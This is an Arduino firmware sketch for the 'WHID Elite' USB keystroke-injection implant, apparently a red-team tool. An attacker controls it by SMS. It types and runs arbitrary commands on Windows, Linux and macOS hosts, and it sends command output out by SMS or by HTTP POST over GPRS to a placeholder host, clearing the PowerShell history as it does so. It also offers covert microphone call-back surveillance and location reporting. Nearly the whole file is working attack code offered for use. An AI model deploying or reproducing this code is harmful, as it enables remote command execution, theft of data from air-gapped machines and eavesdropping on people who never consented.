// ###################################################################################################
// #                                      WHID Elite Hybrid 1.0.1                                  ###
// #                              Copyright 2018-2019 - @LucaBongiorni                             ###
// #                              Fork 2020 HybridC2 - @JoelSernaMoreno                            ###
// ###################################################################################################
// ##################################### Commands Available ##########################################
// ###################################################################################################
// ### batt:                         ### Example: ###   batt:                                        #
// ### enumos:                       ### Example: ###   enumos:                                      #
// ### airgapwin:<COMMAND-TO-EXFIL>  ### Example: ###   airgapwin:whoami                             #
// ### airgapnix:<COMMAND-TO-EXFIL>  ### Example: ###   airgapnix:whoami                             #
// ### airgaposx:<COMMAND-TO-EXFIL>  ### Example: ###   airgaposx:whoami                             #
// ### win:<COMMAND>                 ### Example: ###   win:iexplore -k http://fakeupdate.net/wnc/   #
// ### nix:<COMMAND>                 ### Example: ###   nix:gnome-calculator                         #
// ### osx:<COMMAND>                 ### Example: ###   osx:open -n -a calculator                    #
// ### spy:<PHONE-NUMBER>            ### Example: ###   spy:0039123123123                            #
// ### getlocation:                  ### Example: ###   getlocation:                                 #
// ### hybridC2:                     ### Example: ###   hybridC2:                                    #
// ### hybridC2off:                  ### Example: ###   hybridC2off:                                 #
// ###################################################################################################

#include "Adafruit_FONA.h"
#include "FingerprintUSBHost.h"
#include <Keyboard.h>

int dontSMS=0; // Set to 1 to save SMS
int dontGPRS=0; // Set to 1 to use GPRS
char gprsAirgap[350];
char fonaNotificationBuffer[64];
char smsBuffer[150]; //Default 250. If changed, need also to change Line 615 accordingly.
 
// Dec to Bin https://forum.arduino.cc/index.php?topic=412553.0
char *tobin32(unsigned long x)
{
  static char b[33]; //this size should be enough for any ASK/OOK protocol out there. If not, change it accordingly.
  b[32] = '\0';

  for ( int z = 0; z < 32; z++) {
    b[31 - z] = ((x >> z) & 0x1) ? '1' : '0';
  }

  return b;
}

#define FONA_RX 2
#define FONA_TX 3
#define FONA_RST 4

HardwareSerial *fonaSerial = &Serial1;
Adafruit_FONA fona = Adafruit_FONA(FONA_RST);

//This function return the amount of free memory available. Is used only for debugging.
int freeRam () {
  extern int __heap_start, *__brkval;
  int v;
  return (int) &v - (__brkval == 0 ? (int) &__heap_start : (int) __brkval);
}

void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  Keyboard.begin();

  // ------ Initialize SIM800 ------
  pinMode(13, OUTPUT);
  digitalWrite(13, LOW); //(SIM800 gets resetted ONLY when RST is pulled LOW)
  delay(50);
  digitalWrite(13, HIGH);
  pinMode(2, OUTPUT);
  digitalWrite(2, HIGH); //HIGH == connected to GND
  delay(1000);
  digitalWrite(2, LOW); 
  // ------ Initialize SIM800 ------


  // #########################################################################################
  // ##### This must be commented. Otherwise the script will never start automatically. ######
  // ##### Uncomment, only if you wanna use serial monitor to debug the whole workflow  ######
  // ##### and you wanna start SIM800 manually.                                         ######
  // #########################################################################################
  //while (!Serial);
  // #########################################################################################

  Serial.begin(4800);
  fonaSerial->begin(4800);
  if (! fona.begin(*fonaSerial)) {
    Serial.println(F("NO SIM800!"));
    while (1);
  }
  fona.unlockSIM("1234"); // ### Change this to your SIM's Pincode (if any) ###
  //fonaSerial->print("AT+CLCK=\"SC\",0,\"1234\"\r\n"); // ### This remove permanently your SIM's Pincode ###
  
  //delay(3000); //###LBO: Original Working Delay
  delay(1000);
  fonaSerial->print("AT+CNMI=2,1\r\n");  //Set up the SIM800 to send a +CMTI notification when an SMS is received
  delay(500);
  fona.setGPRSNetworkSettings(F("internet")); //### APN Setting in case you MNO requires specific ones ###

  while(true){
    int i = fona.getNumSMS();
    Serial.print(F("Number of SMS: "));
    Serial.println(i);
    if(i != -1){
      Serial.println(F("\n\rDeleting SMS...")); 
      delay(500);
      if(fona.sendCheckReply(F("AT+CMGDA=\"DEL ALL\"\r\n"), F("OK"), 100)){
        break;
      }
    }
    if(i==0) break;
    delay(500);
  }
  // fonaSerial->print("AT+CLIR=1\r\n"); //### Uncomment this to hide WHIDelite number while calling ###
  Serial.println(F("WHID Elite 1.3.1 is OK")); 
}


void loop() {
  //delay(3000); //###LBO: Original Working Delay
  delay(1000);
  char* bufPtr = fonaNotificationBuffer;

  if (fona.available()) {
  //Serial.println(F("WHID Elite 1.3.1 is OK")); 
    int slot = 0;
    int charCount = 0;
    //Read the notification into fonaInBuffer
    do  {
      *bufPtr = fona.read();
      Serial.write(*bufPtr);
      delay(1);
    } while ((*bufPtr++ != '\n') && (fona.available()) && (++charCount < (sizeof(fonaNotificationBuffer) - 1)));

    //Add a terminal NULL to the notification string
    *bufPtr = 0;

    //Scan the notification string for an SMS received notification.
    // If it's an SMS message, we'll get the slot number in 'slot'
    if (1 == sscanf(fonaNotificationBuffer, "+CMTI: " FONA_PREF_SMS_STORAGE ",%d", &slot)) {
      Serial.print(F("slot: ")); Serial.println(slot);

      char callerIDbuffer[32];  //We'll store the SMS sender number in here

      // Retrieve SMS sender address/phone number.
      if (! fona.getSMSSender(slot, callerIDbuffer, 31)) {
        Serial.println(F("Didn't find SMS message in slot!"));
      }
      //Serial.print(F("FROM: ")); Serial.println(callerIDbuffer);

      // Retrieve SMS value.
      uint16_t smslen;


      if (fona.readSMS(slot, smsBuffer, 150, &smslen)) { //Default 250. If changed, need also to change Line 538 accordingly.
        //############################################################################################
        //######################### HERE ARE STARTING THE COMMANDS AVAILABLE #########################
        //############################################################################################

        //####### airgapwin: ################################################################################################################################
        //# It opens a powershell, types the exfil-payload (with the payload contained into the SMS that you want to exfiltrate. e.g. whoami), then runs it.
        //###################################################################################################################################################
        if (strncmp(smsBuffer, "airgapwin:", 10) == 0) {
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 114); //In Decimal, is r
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print("powershell"); // we need to type cmd and then insert payload there, because of a RUN textbox limitation buffer of 260 chars.
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.print(F("$c=(gwmi Win32_SerialPort|Where-Object{$_.PNPDeviceID -match \"ID_1B4F&PID_9208\"}).DeviceID;$r="));
          delay(300);
          Keyboard.print(smsBuffer + 10);
          delay(300);
          // Clear-History or ALT+F7
          Keyboard.print(F(";$p=new-Object System.IO.Ports.SerialPort $c,4800,None,8,one;$p.open();$p.WriteLine(\"BAG:$r\");$p.Close();Clear-History -CommandLine \"*$*\";exit;"));
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
        }
        
        //####### airgapnix: ###########################################################################################################################
        //# It opens a shell, types the exfil-payload (with the payload contained into the SMS that you want to exfiltrate. e.g. whoami), then runs it.
        //##############################################################################################################################################
        else if (strncmp(smsBuffer, "airgapnix:", 10) == 0) {
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print("term");
          delay(1500);
          typeKey(KEY_RETURN);
          delay(1200);
          Keyboard.print(F(" sleep .5;l=$(ls /dev/serial/by-id/*LilyPad*);stty -F $l 4800;echo BAG:$(echo $("));
          delay(300);
          Keyboard.print(smsBuffer + 10);
          delay(300);
          Keyboard.print(F(")) > $l"));
          //*/
          delay(1500);
          typeKey(KEY_RETURN);
          delay(1500);
        }
        
        //####### airgaposx: ###########################################################################################################################
        //# It opens a shell, types the exfil-payload (with the payload contained into the SMS that you want to exfiltrate. e.g. whoami), then runs it
        //##############################################################################################################################################
        //TODO: Despite it works, there is a bug. It doesn't like symbols. Need to sanitize them with with quotes or backslash. (e.g. airgapnix:uname -a >>>> FAIL / aigapnix:uname >>>> PASS)
        else if (strncmp(smsBuffer, "airgaposx:", 10) == 0) {
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 32); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print("terminal.app");
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.print(F("sleep .5;stty -f /dev/cu.usbmodemHID* 4800;echo -e \"BAG:\"$(")); //not sure if in all OSX machines, WHID Elite's serial port is identified a scu.usbmodemHIDF1, it may need more checks
          delay(300);
          Keyboard.print(smsBuffer + 10);
          delay(300);
          Keyboard.print(F(") > /dev/cu.usbmodemHID*;")); //Not sure if in all OSX machines, WHID Elite's serial port is identified as cu.usbmodemHIDF1 or cu.usbmodemHIDFG1 or cu.usbmodemHIDPC1 , it may need more checks.
          //If you do plug WHID Elite into an OSX-based machine… can you send me the output of this command: ls /dev/cu*
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.press(KEY_LEFT_GUI); //CMD
          delay(50);
          Keyboard.press((char) 113); //q
          Keyboard.releaseAll(); //CMD + q >> quits focused window
        }
        
        //####### hybridC2: #############################################################################
        //# Enable and configure Hybrid C&C
        //##########################################################################################
        else if (strncmp(smsBuffer, "hybridC2:", 9) == 0) {
          delay(500);
          if (!fona.enableGPRS(true))
            Serial.println(F("Failed to turn on GPRS"));
//          fonaSerial->println("AT+SAPBR=3,1,\"CONTYPE\",\"GPRS\"");
//          delay(1000);
//          fonaSerial->println("AT+SAPBR=3,1,\"APN\",\"internet\"");
//          delay(2000);
//          fonaSerial->println("AT+SAPBR=3,1,\"USER\",\"\"");
//          delay(1000);
//          fonaSerial->println("AT+SAPBR=3,1,\"PWD\",\"\"");
//          delay(1000);
//          fonaSerial->println("AT+SAPBR=1,1");
//          delay(2000);
//          fonaSerial->println("AT+SAPBR=2,1");
          delay(500);
          fona.sendSMS(callerIDbuffer, "HybridC2 activated");
          dontGPRS=1;
          dontSMS="pause";         
        }
        
        //####### hybridC2off: #############################################################################
        //# Disable hybrid C&C
        //##########################################################################################
        else if (strncmp(smsBuffer, "hybridC2off:", 12) == 0) {
          if (!fona.enableGPRS(false))
            Serial.println(F("Failed to turn off GPRS"));
          delay(500);
//          fonaSerial->println("AT+CIPSHUT");
//          delay(1000);
//          fonaSerial->println("AT+SAPBR=0,1");
//          delay(1000);
//          fonaSerial->println("AT+CGATT=0");
          dontSMS = 0;
          dontGPRS = 0;
          fona.sendSMS(callerIDbuffer, "HybridC2 disabled");
        }
        
        //####### win: #############################################################################
        //# It runs GUI+r, opens a CMD shell and executes the payload contained into the SMS
        //##########################################################################################
        else if (strncmp(smsBuffer, "win:", 4) == 0) {
          // It runs GUI+r, opens a CMD shell and executes the payload contained into the SMS
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 114); //In Decimal, is r
          //Keyboard.write((char) 0x72); //In Hex
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print((smsBuffer + 4));
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
        }
        
        //####### nix: #############################################################################
        //# It runs ALT + F2, opens a shell and executes the payload contained into the SMS
        //##########################################################################################
        else if (strncmp(smsBuffer, "nix:", 4) == 0) {
          // It runs ALT + F2, opens a shell and executes the payload contained into the SMS
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.releaseAll();
          delay(1000);
          // No need for terminal ALT-F2 straight runs commands
          // And it is multi-desktop solution
          Keyboard.print("term");
          delay(1500);
          typeKey(KEY_RETURN);
          delay(1500);
          Keyboard.print(" ");
          Keyboard.print(smsBuffer + 4);
          //Keyboard.print(";exit");
          delay(1500);
          typeKey(KEY_RETURN);
          delay(1000);
        }
        
        //####### osx: #############################################################################
        //# It opens a shell and executes the payload contained into the SMS
        //##########################################################################################
        else if (strncmp(smsBuffer, "osx:", 4) == 0) {
          // It opens a shell and executes the payload contained into the SMS
          delay(500);
          Keyboard.press(KEY_LEFT_GUI);
          delay(50);
          Keyboard.press((char) 32); //In Decimal, is SPACE
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.print("terminal.app");
          delay(1000);
          typeKey(KEY_RETURN);
          delay(1000);
          Keyboard.print(smsBuffer + 4);
          delay(1000);
          typeKey(KEY_RETURN);
        }
        
        //####### spy: ############################################
        //# It enables the internal Microphone and calls you back.
        //#########################################################
        else if (strncmp(smsBuffer, "spy:", 4) == 0) {
          delay(1000);
          
          if (!fona.callPhone((smsBuffer + 4))) {
            Serial.println(F("Call Failed"));
          } else {
            Serial.println(F("### STARTING ACOUSTIC SURVEILLANCE ###"));
            delay(1000);
          }
        }
        
        //####### getlocation: ########################################################
        //# It queries the BTS/BSC for the CellTower coordinates and send back to you!
        //#############################################################################
        else if (strncmp(smsBuffer, "getlocation:", 12) == 0) {
          //enable GPRS
          if (!fona.enableGPRS(true))
            Serial.println(F("Failed to turn on GPRS"));
          //Get GPS coordinates
          char replybuffer[50];
          uint16_t returncode;
          delay(1500);
          if (!fona.getGSMLoc(&returncode, replybuffer, 50))
            Serial.println(F("Failed!"));
          if (returncode == 0) {
            Serial.println(replybuffer);
          }
          else {
            Serial.print(F("Fail code #"));
            Serial.println(returncode);
          }
          delay(1500);
          //disable GPRS
          if (!fona.enableGPRS(false))
            Serial.println(F("Failed to turn off GPRS"));
          //send SMS
          delay(1500);
          fona.sendSMS(callerIDbuffer, replybuffer);
        }
        
        //####### enumos: ##########
        //# Enumerate Target's OS
        //##########################
        else if (strncmp(smsBuffer, "enumos:", 7) == 0) {
          delay(500);
          String os;
          FingerprintUSBHost.guessHostOS(os);
          char opsys[os.length() + 1];
          os.toCharArray(opsys, os.length() + 1);
          delay(200);
          fona.sendSMS(callerIDbuffer, opsys);
        }
        //####### batt: ############
        //# Get Battery Percentage
        //##########################
        else if (strncmp(smsBuffer, "batt:", 5) == 0) {
          uint16_t vbat;   
          delay(500);
          //fona.getBattVoltage(&vbat);
          fona.getBattPercent(&vbat);
          uint8_t tbat = (uint8_t)vbat;
          String batt = String(tbat);
          char battZ[batt.length() + 1];
          batt.toCharArray(battZ, batt.length() + 1);
          fona.sendSMS(callerIDbuffer, battZ);
          Serial.print(F("Batt % = "));
          Serial.println(battZ);     
         }
        else {
          if(dontSMS != 1)
            //dontSMS=2;
          Serial.println(F("No reply!"));
        }
      }
    
      String cmd = Serial.readStringUntil(':');
      
      if (dontGPRS == 1 && cmd == "BAG") {
        String BypassAirGap = Serial.readString();
        BypassAirGap.toCharArray(gprsAirgap, 350);
        delay(500);
        int gprsAirgapSize = strlen(gprsAirgap);
        delay(1000);
        fonaSerial->println("AT+HTTPINIT");
        delay(1000);
        fonaSerial->println("AT+HTTPPARA=\"CID\",1");
        delay(2000);
        fonaSerial->println("AT+HTTPPARA=\"URL\",\"CHANGE-ME.COM\""); // example: whid.elite.com
        delay(2000);
        fonaSerial->print("AT+HTTPDATA=");
        fonaSerial->print(gprsAirgapSize);
        fonaSerial->println(",5000");
        delay(500);

        ///// DEBUG //////////////////////////////////
      /*  Serial.print("Airgap: ");
        Serial.println(BypassAirGap);
        Serial.print("gprsAirgap: ");
        Serial.println(gprsAirgap); */
        //////////////////////////////////////////////

        fonaSerial->println(gprsAirgap);
        delay(500);
        fonaSerial->println("AT+HTTPACTION = 1");
      }
      else if (dontSMS == 0 && cmd == "BAG") {
        String BypassAirGap = Serial.readStringUntil('\n');
        fona.sendSMS(callerIDbuffer, BypassAirGap.c_str());
      }
      delay(500);
      //Ack received message.(Comment it if wanna save SMSes)
      if(dontSMS == 0)
        fona.sendSMS(callerIDbuffer, "CMD ACKed & EXECed");
      else if(dontSMS == 2)
        //dontSMS = 0;
      
      delay(1500);
      fonaSerial->print("AT+CMGDA=\"DEL ALL\"\r\n");    
    }
  }
}
